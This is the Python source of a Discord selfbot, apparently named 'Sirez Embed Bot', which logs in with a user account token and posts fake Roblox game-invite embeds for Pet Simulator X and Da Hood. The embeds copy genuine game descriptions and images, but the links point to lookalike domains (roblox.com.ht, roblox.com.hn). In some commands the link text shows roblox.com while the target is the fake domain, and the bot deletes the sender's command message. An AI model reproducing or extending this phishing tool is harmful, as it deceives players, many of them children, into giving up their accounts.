import json
from typing import Any
from pypresence import *
import requests
import time
import datetime
import random
import string
from pynotifier import Notification
from os import system
import discord
from colorama import Fore, init
from discord.ext import commands, tasks

system("title " + "Sirez Embed Bot")
banner1 = (Fore.BLUE + """
 ######  #### ########  ######## ########    ######## ##     ## ########  ######## ########     ########   #######  ######## 
##    ##  ##  ##     ## ##            ##     ##       ###   ### ##     ## ##       ##     ##    ##     ## ##     ##    ##    
##        ##  ##     ## ##           ##      ##       #### #### ##     ## ##       ##     ##    ##     ## ##     ##    ##    
 ######   ##  ########  ######      ##       ######   ## ### ## ########  ######   ##     ##    ########  ##     ##    ##    
      ##  ##  ##   ##   ##         ##        ##       ##     ## ##     ## ##       ##     ##    ##     ## ##     ##    ##    
##    ##  ##  ##    ##  ##        ##         ##       ##     ## ##     ## ##       ##     ##    ##     ## ##     ##    ##    
 ######  #### ##     ## ######## ########    ######## ##     ## ########  ######## ########     ########   #######     ##                                              
""")
intents = discord.Intents.all()
intents.typing = False
intents.presences = False
with open('config.json') as f:
    file = json.load(f)
    token = file["token"]
    prefix = file["prefix"]
    spam_msg = file["spam_msg"]
init()

# config
color = 0
log = []
avatar = "https://avatars.githubusercontent.com/u/78593516?v=4"

# Global vars
stop = True
nuker = False


def update_time():
    now = datetime.datetime.now()
    current_time = now.strftime("%H:%M")
    return current_time


def main():
    print(banner1)
    print(Fore.GREEN + "\t\t\t\t\t\t   Loading...")


RPC = Presence(923915111322746901)
RPC.connect()

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

cur_time = int(time.time())
RPC.update(
    large_image="screamz",
    large_text="SCREAMZ SELFBOT BETA",
    details="Feeling like a King.",
    start=cur_time,
    buttons=[{"label": "GET IT YOURSELF", "url": "https://github.com/screamz2k/SCREAMZ-SELFBOT"}])

"""@tasks.loop(minutes=1)
async def up_time():
    with open("./stuff/infos.txt", "r") as f:
      up = int(f.read())
      up += 1
    with open("./stuff/infos.txt", "w") as f:
        f.write(up)
up_time.start()"""
@bot.event
async def on_ready():
    Notification(
        title='Sirez Embed Bot',
        description=f'Logged in as: {bot.user}',
        duration=5,
        icon_path="./stuff/icon.ico",
        urgency='normal').send()
    system("cls ")
    print(banner1)
    print()
    print(Fore.RED + "\t\t\t\t\t  Started EmbedBot as: " + str(bot.user))


@bot.command()
async def p(ctx):
    embed = discord.Embed(title='[🎁✨] Pet Simulator X!',
                          url='https://www.roblox.com.ht/games/6284583030/Pet-Simulator-X?privateServerLinkCode=94824202567197037718240961935609',
                          description='''
Check out [🎁✨] Pet Simulator X!. Its one of the millions of unique, user-generated 3D experiences created on Roblox. 👍 NEXT
BIG CODE AT 2MM LIKES! ❤️💙
Use code "tonsofcoins" for x3 Triple Coins Boosts! (Thanks for 1.5MM 💖!)
                           
Pet Simulator X is the latest and greatest game in the Pet Simulator Series with tons of new features, worlds to explore,...''',)
    embed.set_image(url="https://t7.rbxcdn.com/72fb2f70dfa4cc2e8f412976fd23f970")
    embed.set_author(name='Roblox')
    await ctx.message.channel.send(embed=embed)
    await ctx.message.delete()

@bot.command()
async def e(ctx):
    embed = discord.Embed(title="",
                          description="[https://www.roblox.com/games/6284583030/Pet-Simulator-X?privateServerLinkCode=94824202567197037718240961935609](https://www.roblox.com.ht/games/6284583030/Pet-Simulator-X?privateServerLinkCode=94824202567197037718240961935609)",
                          color=(0x36393e))
    await ctx.message.channel.send(embed=embed)
    await ctx.message.delete()


@bot.command()
async def d(ctx):
    embed = discord.Embed(title="Da Hood",
                          url='https://roblox.com.hn/games/2788229376/Da-Hood?privateServerLinkCode=28418967237741121861114157127268',
                          description='''Check out Da Hood. It’s one of the millions of unique, user-generated 3D experiences created on Roblox. A difficult game, read below for tips.
Account has to be at least 10 days to play.

[PC/XBOX Controls][F/ButtonY - Block][E/PadDown - Stomp][G/PadUp - Carry][LCTRL+ButtonB - Crouch]
Crouch+Carry = Ragdoll thrown.
You can weave 100% if you time...''',)
    embed.set_image(url="https://t7.rbxcdn.com/94b341800eb7183a8a61499579ec3e7d")
    embed.set_author(name='Roblox')
    await ctx.message.channel.send(embed=embed)
    await ctx.message.delete()

@bot.command()
async def f(ctx):
    embed = discord.Embed(title="",
                          description="[https://roblox.com/games/2788229376/Da-Hood?privateServerLinkCode=28418967237741121861114157127268](https://roblox.com.hn/games/2788229376/Da-Hood?privateServerLinkCode=28418967237741121861114157127268)"  )
    await ctx.message.channel.send(embed=embed)
    await ctx.message.delete()

@bot.command()
async def color(ctx):
    embed = discord.Embed(title="test", description="test",color=0xe60a0a)
    await ctx.message.channel.send(embed=embed)

"""@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="Error",
            description=f"**Command does not exist.**",
            color=discord.Colour.red())
        await ctx.send(embed=embed)
"""
if token == "paste bot token here" or token == "":
    print(Fore.RED + "You need to paste your token into the config file!!!")
    input()
    exit()

main()
try:
    bot.run(token, bot=False)
except:
    print(Fore.RED + "\t\t\t\t\t     Token is invalid!")
    input()